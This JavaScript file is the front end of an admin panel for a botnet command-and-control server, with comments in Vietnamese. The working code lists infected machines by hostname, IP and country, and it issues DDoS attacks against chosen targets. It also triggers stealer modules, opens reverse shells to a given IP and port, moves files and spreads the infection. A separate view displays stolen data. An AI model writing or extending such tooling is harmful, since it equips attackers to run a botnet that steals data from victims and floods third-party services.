/**
 * app.js
 * C2 Botnet Admin Panel - JavaScript
 * Chuc nang: dang nhap, quan ly bot, gui lenh, xem steal, export, realtime log
 */

/* Bien toan cuc */
let authToken = '';
let serverBaseURL = '';

/**
 * Khoi tao khi trang duoc load
 */
document.addEventListener('DOMContentLoaded', function() {
    /* Xac dinh URL server */
    serverBaseURL = window.location.origin;
    
    /* Kiem tra token da luu */
    const savedToken = localStorage.getItem('c2_auth_token');
    if (savedToken) {
        authToken = savedToken;
        showDashboard();
    }
    
    /* Su kien form dang nhap */
    document.getElementById('login-form').addEventListener('submit', handleLogin);
    
    /* Su kien nut dang xuat */
    document.getElementById('btn-logout').addEventListener('click', handleLogout);
    
    /* Su kien navigation tabs */
    document.querySelectorAll('.nav-item').forEach(function(item) {
        item.addEventListener('click', function(e) {
            e.preventDefault();
            var tabName = this.getAttribute('data-tab');
            switchTab(tabName);
        });
    });
    
    /* Su kien cac nut loc */
    document.getElementById('btn-filter').addEventListener('click', loadBots);
    document.getElementById('btn-delete-offline').addEventListener('click', deleteOfflineBots);
    
    /* Su kien gui lenh DDoS */
    document.getElementById('btn-send-ddos').addEventListener('click', sendDDoS);
    
    /* Su kien gui lenh Stealer */
    document.getElementById('btn-send-steal').addEventListener('click', sendStealer);
    
    /* Su kien gui lenh Remote */
    document.getElementById('btn-send-remote').addEventListener('click', sendRemote);
    document.getElementById('remote-action-select').addEventListener('change', toggleRemoteFields);
    
    /* Su kien gui lenh Spreader */
    document.getElementById('btn-send-spread').addEventListener('click', sendSpreader);
    
    /* Su kien loc steal */
    document.getElementById('btn-filter-steals').addEventListener('click', loadSteals);
    
    /* Su kien log */
    document.getElementById('btn-clear-log').addEventListener('click', function() {
        document.getElementById('full-log-box').innerHTML = '';
        document.getElementById('realtime-log-box').innerHTML = '';
    });
    document.getElementById('btn-refresh-log').addEventListener('click', function() {
        var flb = document.getElementById('full-log-box');
        var rlb = document.getElementById('realtime-log-box');
        if (rlb) { flb.innerHTML = rlb.innerHTML; }
    });
    
    /* Cap nhat dong ho server */
    setInterval(updateServerTime, 1000);
    updateServerTime();
});

/**
 * Ham dang nhap
 */
function handleLogin(e) {
    e.preventDefault();
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var errorEl = document.getElementById('login-error');
    
    fetch(serverBaseURL + '/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username, password: password })
    })
    .then(function(response) { return response.json(); })
    .then(function(data) {
        if (data.success) {
            authToken = data.data.token;
            localStorage.setItem('c2_auth_token', authToken);
            showDashboard();
        } else {
            errorEl.textContent = data.message || 'Dang nhap that bai';
            errorEl.style.display = 'block';
        }
    })
    .catch(function(err) {
        errorEl.textContent = 'Loi ket noi den server: ' + err.message;
        errorEl.style.display = 'block';
    });
}

/**
 * Ham dang xuat
 */
function handleLogout() {
    localStorage.removeItem('c2_auth_token');
    authToken = '';
    document.getElementById('login-page').style.display = 'flex';
    document.getElementById('dashboard').style.display = 'none';
}

/**
 * Hien thi dashboard sau khi dang nhap
 */
function showDashboard() {
    document.getElementById('login-page').style.display = 'none';
    document.getElementById('dashboard').style.display = 'flex';
    
    /* Load du lieu ban dau */
    switchTab('overview');
    loadStats();
    loadBots();
    loadBotSelects();
    
    /* Tu dong refresh */
    setInterval(loadStats, 30000);
    setInterval(loadBots, 30000);
}

/**
 * Chuyen tab
 */
function switchTab(tabName) {
    /* Cap nhat navigation */
    document.querySelectorAll('.nav-item').forEach(function(item) {
        item.classList.remove('active');
        if (item.getAttribute('data-tab') === tabName) {
            item.classList.add('active');
        }
    });
    
    /* Cap nhat noi dung */
    document.querySelectorAll('.tab-content').forEach(function(content) {
        content.classList.remove('active');
    });
    document.getElementById('tab-' + tabName).classList.add('active');
    
    /* Load du lieu cho tab */
    if (tabName === 'overview') { loadStats(); }
    if (tabName === 'bots') { loadBots(); loadBotSelects(); }
    if (tabName === 'stealer') { loadSteals(); }
}

/**
 * API call helper
 */
function apiCall(endpoint, method, body) {
    var headers = { 'Content-Type': 'application/json' };
    if (authToken) {
        headers['Authorization'] = 'Bearer ' + authToken;
    }
    
    var options = { method: method || 'GET', headers: headers };
    if (body) { options.body = JSON.stringify(body); }
    
    return fetch(serverBaseURL + endpoint, options)
        .then(function(response) { return response.json(); })
        .catch(function(err) {
            console.error('API call error:', err);
            return { success: false, message: err.message };
        });
}

/**
 * Load thong ke tong quan
 */
function loadStats() {
    apiCall('/api/stats').then(function(data) {
        if (data.success) { updateStatsUI(data.data); }
    });
}

/**
 * Cap nhat UI thong ke
 */
function updateStatsUI(stats) {
    if (!stats) { return; }
    
    document.getElementById('stat-total-bots').textContent = stats.total_bots || 0;
    document.getElementById('stat-online-bots').textContent = stats.online_bots || 0;
    document.getElementById('stat-offline-bots').textContent = stats.offline_bots || 0;
    document.getElementById('stat-total-commands').textContent = stats.total_commands || 0;
    document.getElementById('stat-total-steals').textContent = stats.total_steals || 0;
    
    /* Cap nhat bieu do quoc gia */
    if (stats.countries) {
        var countriesDiv = document.getElementById('chart-countries');
        countriesDiv.innerHTML = '';
        var entries = Object.entries(stats.countries);
        var maxCount = Math.max.apply(null, entries.map(function(e) { return e[1]; }));
        if (maxCount < 1) { maxCount = 1; }
        
        entries.forEach(function(entry) {
            var country = entry[0];
            var count = entry[1];
            var percent = (count / maxCount * 100);
            var row = document.createElement('div');
            row.className = 'bar-row';
            row.innerHTML = '<span class="bar-label">' + (country || 'Unknown') + '</span>' +
                '<div class="bar-track"><div class="bar-fill" style="width:' + percent + '%"></div></div>' +
                '<span class="bar-count">' + count + '</span>';
            countriesDiv.appendChild(row);
        });
    }
    
    /* Cap nhat bieu do OS */
    if (stats.os_distribution) {
        var osDiv = document.getElementById('chart-os');
        osDiv.innerHTML = '';
        var entries = Object.entries(stats.os_distribution);
        var maxCount = Math.max.apply(null, entries.map(function(e) { return e[1]; }));
        if (maxCount < 1) { maxCount = 1; }
        
        entries.forEach(function(entry) {
            var os = entry[0];
            var count = entry[1];
            var percent = (count / maxCount * 100);
            var row = document.createElement('div');
            row.className = 'bar-row';
            row.innerHTML = '<span class="bar-label">' + os + '</span>' +
                '<div class="bar-track"><div class="bar-fill" style="width:' + percent + '%"></div></div>' +
                '<span class="bar-count">' + count + '</span>';
            osDiv.appendChild(row);
        });
    }
}

/**
 * Load danh sach bot
 */
function loadBots() {
    var search = document.getElementById('filter-search').value;
    var status = document.getElementById('filter-status').value;
    var query = '';
    if (search) { query += '&search=' + encodeURIComponent(search); }
    if (status) { query += '&status=' + encodeURIComponent(status); }
    
    apiCall('/api/bots?' + (query ? query.substring(1) : '')).then(function(data) {
        if (data.success && data.data && data.data.bots) {
            renderBotsTable(data.data.bots);
        }
    });
}

/**
 * Render bang bot
 */
function renderBotsTable(bots) {
    var tbody = document.getElementById('bots-table-body');
    tbody.innerHTML = '';
    
    if (bots.length === 0) {
        tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;padding:20px;">Khong co bot nao</td></tr>';
        return;
    }
    
    bots.forEach(function(bot) {
        var tr = document.createElement('tr');
        var lastSeen = new Date(bot.last_seen).toLocaleString('vi-VN');
        var statusClass = (bot.status === 'online') ? 'status-online' : 'status-offline';
        var statusText = (bot.status === 'online') ? 'Online' : 'Offline';
        
        tr.innerHTML = '<td style="font-family:monospace;font-size:11px;">' + bot.id.substring(0, 12) + '...</td>' +
            '<td>' + (bot.hostname || 'N/A') + '</td>' +
            '<td>' + (bot.os || 'N/A') + '</td>' +
            '<td>' + (bot.ip || 'N/A') + '</td>' +
            '<td>' + (bot.country || 'N/A') + '</td>' +
            '<td>' + lastSeen + '</td>' +
            '<td><span class="status-badge ' + statusClass + '">' + statusText + '</span></td>' +
            '<td>' +
                '<button class="btn btn-primary btn-sm" onclick="viewBotDetail(\'' + bot.id + '\')">Chi tiet</button> ' +
                '<button class="btn btn-danger btn-sm" onclick="deleteBot(\'' + bot.id + '\')">Xoa</button>' +
            '</td>';
        tbody.appendChild(tr);
    });
}

/**
 * Xem chi tiet bot
 */
function viewBotDetail(botID) {
    apiCall('/api/bots/' + botID).then(function(data) {
        if (data.success) {
            var info = JSON.stringify(data.data, null, 2);
            alert('Thong tin bot:\n\n' + info.substring(0, 1000));
        }
    });
}

/**
 * Xoa bot
 */
function deleteBot(botID) {
    if (!confirm('Ban co chac muon xoa bot ' + botID + '?')) { return; }
    apiCall('/api/bots/' + botID, 'DELETE').then(function(data) {
        addLog(data.success ? 'success' : 'error', data.message);
        loadBots();
        loadStats();
        loadBotSelects();
    });
}

/**
 * Xoa tat ca bot offline
 */
function deleteOfflineBots() {
    if (!confirm('Ban co chac muon xoa TAT CA bot offline?')) { return; }
    apiCall('/api/bots?status=offline').then(function(data) {
        if (data.success && data.data && data.data.bots) {
            var promises = [];
            data.data.bots.forEach(function(bot) {
                promises.push(apiCall('/api/bots/' + bot.id, 'DELETE'));
            });
            Promise.all(promises).then(function() {
                addLog('success', 'Da xoa tat ca bot offline');
                loadBots();
                loadStats();
                loadBotSelects();
            });
        }
    });
}

/**
 * Load danh sach bot cho cac select
 */
function loadBotSelects() {
    apiCall('/api/bots?status=online&limit=200').then(function(data) {
        if (!data.success || !data.data || !data.data.bots) { return; }
        
        var selects = ['ddos-bot-select', 'steal-bot-select', 'remote-bot-select', 'spread-bot-select'];
        selects.forEach(function(selectId) {
            var sel = document.getElementById(selectId);
            if (!sel) { return; }
            sel.innerHTML = '<option value="all">Tat ca Bot Online</option>';
            data.data.bots.forEach(function(bot) {
                sel.innerHTML += '<option value="' + bot.id + '">' + bot.hostname + ' (' + bot.ip + ')</option>';
            });
        });
    });
}

/**
 * Gui lenh DDoS
 */
function sendDDoS() {
    var target = document.getElementById('ddos-target').value;
    var port = document.getElementById('ddos-port').value;
    var threads = document.getElementById('ddos-threads').value;
    var duration = document.getElementById('ddos-duration').value;
    var method = document.getElementById('ddos-method').value;
    var botID = document.getElementById('ddos-bot-select').value;
    
    if (!target) { alert('Vui long nhap muc tieu!'); return; }
    
    var params = JSON.stringify({
        url: target,
        port: parseInt(port),
        threads: parseInt(threads),
        duration: parseInt(duration)
    });
    
    apiCall('/api/command', 'POST', {
        bot_id: botID,
        module: 'ddos',
        action: method,
        params: params
    }).then(function(data) {
        addLog(data.success ? 'success' : 'error', data.message);
        var resultDiv = document.getElementById('ddos-result');
        if (resultDiv) {
            resultDiv.innerHTML += '<div class="log-entry"><span class="type ' + (data.success ? 'success' : 'error') + '">[' + new Date().toLocaleTimeString('vi-VN') + ']</span> ' + data.message + '</div>';
        }
    });
}

/**
 * Gui lenh Stealer
 */
function sendStealer() {
    var module = document.getElementById('steal-module-select').value;
    var botID = document.getElementById('steal-bot-select').value;
    
    apiCall('/api/command', 'POST', {
        bot_id: botID,
        module: 'stealer',
        action: module,
        params: '{}'
    }).then(function(data) {
        addLog(data.success ? 'success' : 'error', data.message);
        setTimeout(loadSteals, 5000);
    });
}

/**
 * Gui lenh Remote Access
 */
function sendRemote() {
    var action = document.getElementById('remote-action-select').value;
    var botID = document.getElementById('remote-bot-select').value;
    var ip = document.getElementById('remote-ip').value;
    var port = document.getElementById('remote-port').value;
    var path = document.getElementById('remote-path').value;
    
    var params = JSON.stringify({
        ip: ip,
        port: parseInt(port),
        path: path
    });
    
    apiCall('/api/command', 'POST', {
        bot_id: botID,
        module: 'remote',
        action: action,
        params: params
    }).then(function(data) {
        addLog(data.success ? 'success' : 'error', data.message);
        var resultDiv = document.getElementById('remote-result');
        if (resultDiv) {
            resultDiv.innerHTML += '<div class="log-entry"><span class="type ' + (data.success ? 'success' : 'error') + '">[' + new Date().toLocaleTimeString('vi-VN') + ']</span> ' + data.message + '</div>';
        }
    });
}

/**
 * Hien/an truong IP/Port/Path cho Remote Access
 */
function toggleRemoteFields() {
    var action = document.getElementById('remote-action-select').value;
    var rowIP = document.getElementById('row-remote-ip');
    var rowPort = document.getElementById('row-remote-port');
    var rowPath = document.getElementById('row-remote-path');
    
    if (rowIP) { rowIP.style.display = (action === 'reverse_shell') ? 'flex' : 'none'; }
    if (rowPort) { rowPort.style.display = (action === 'reverse_shell') ? 'flex' : 'none'; }
    if (rowPath) { rowPath.style.display = (action === 'download_file' || action === 'upload_file') ? 'flex' : 'none'; }
}

/**
 * Gui lenh Spreader
 */
function sendSpreader() {
    var method = document.getElementById('spread-method-select').value;
    var botID = document.getElementById('spread-bot-select').value;
    
    apiCall('/api/command', 'POST', {
        bot_id: botID,
        module: 'spreader',
        action: method,
        params: '{}'
    }).then(function(data) {
        addLog(data.success ? 'success' : 'error', data.message);
        var resultDiv = document.getElementById('spread-result');
        if (resultDiv) {
            resultDiv.innerHTML += '<div class="log-entry"><span class="type ' + (data.success ? 'success' : 'error') + '">[' + new Date().toLocaleTimeString('vi-VN') + ']</span> ' + data.message + '</div>';
        }
    });
}

/**
 * Load du lieu steal
 */
function loadSteals() {
    var dataType = document.getElementById('steal-filter-type').value;
    var query = '';
    if (dataType) { query += '&data_type=' + encodeURIComponent(dataType); }
    
    apiCall('/api/steals?limit=50' + (query || '')).then(function(data) {
        if (data.success && data.data && data.data.steals) {
            renderSteals(data.data.steals);
        }
    });
}

/**
 * Render du lieu steal
 */
function renderSteals(steals) {
    var container = document.getElementById('steals-data-container');
    if (!container) { return; }
    container.innerHTML = '';
    
    if (steals.length === 0) {
        container.innerHTML = '<p style="text-align:center;padding:40px;">Khong co du lieu steal nao</p>';
        return;
    }
    
    steals.forEach(function(steal) {
        var card = document.createElement('div');
        card.className = 'data-card';
        
        var dataPreview = '';
        try {
            var parsed = JSON.parse(steal.data);
            dataPreview = JSON.stringify(parsed, null, 2);
        } catch(e) {
            dataPreview = steal.data.substring(0, 500);
        }
        
        if (dataPreview.length > 1000) {
            dataPreview = dataPreview.substring(0, 1000) + '\n\n... (con tiep, bam Export de tai toan bo)';
        }
        
        var timestamp = new Date(steal.timestamp).toLocaleString('vi-VN');
        
        card.innerHTML = '<h4>' + steal.data_type.toUpperCase() + ' - Bot: ' + steal.bot_id.substring(0, 8) + '...</h4>' +
            '<p style="font-size:11px;color:var(--text-muted);margin-bottom:5px;">' + timestamp + '</p>' +
            '<pre>' + escapeHtml(dataPreview) + '</pre>';
        container.appendChild(card);
    });
}

/**
 * Escape HTML
 */
function escapeHtml(text) {
    var map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}

/**
 * Them log vao khung realtime
 */
function addLog(type, message) {
    var now = new Date();
    var timeStr = '[' + now.toLocaleTimeString('vi-VN') + ']';
    var entryHTML = '<div class="log-entry"><span class="time">' + timeStr + '</span>' +
        '<span class="type ' + type + '">' + type.toUpperCase() + '</span> ' + message + '</div>';
    
    /* Them vao realtime log box */
    var rlb = document.getElementById('realtime-log-box');
    if (rlb) {
        rlb.innerHTML = entryHTML + rlb.innerHTML;
        /* Gioi han so log */
        while (rlb.children.length > 500) {
            rlb.removeChild(rlb.lastChild);
        }
    }
    
    /* Them vao full log box */
    var flb = document.getElementById('full-log-box');
    if (flb) {
        flb.innerHTML = entryHTML + flb.innerHTML;
        while (flb.children.length > 500) {
            flb.removeChild(flb.lastChild);
        }
    }
}

/**
 * Cap nhat dong ho server
 */
function updateServerTime() {
    var el = document.getElementById('server-time');
    if (el) {
        var now = new Date();
        el.textContent = now.toLocaleDateString('vi-VN') + ' ' + now.toLocaleTimeString('vi-VN');
    }
}
